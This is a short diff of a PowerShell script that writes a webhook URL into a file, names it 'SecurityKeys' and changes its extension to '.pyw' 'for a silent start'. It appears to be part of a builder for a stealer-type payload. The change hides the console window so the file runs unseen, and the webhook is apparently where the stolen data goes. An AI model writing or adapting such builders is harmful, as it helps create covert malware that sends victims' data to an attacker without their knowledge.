@@ -168,8 +168,9 @@ $targetString = "WillBeReplaceBiUrWebHook"
 $text = Get-Content $file
 $newText = $text -replace $targetString, $webhookurl
 $newText | Set-Content $file
-Rename-Item -Path $file -NewName "SecurityKeys.py"
+Rename-Item -Path $file -NewName "SecurityKeys.pyw"
 #I don't use chatGPT 
+#.pyw for a silent start 
 ######################################################################
 
 ######################################################################
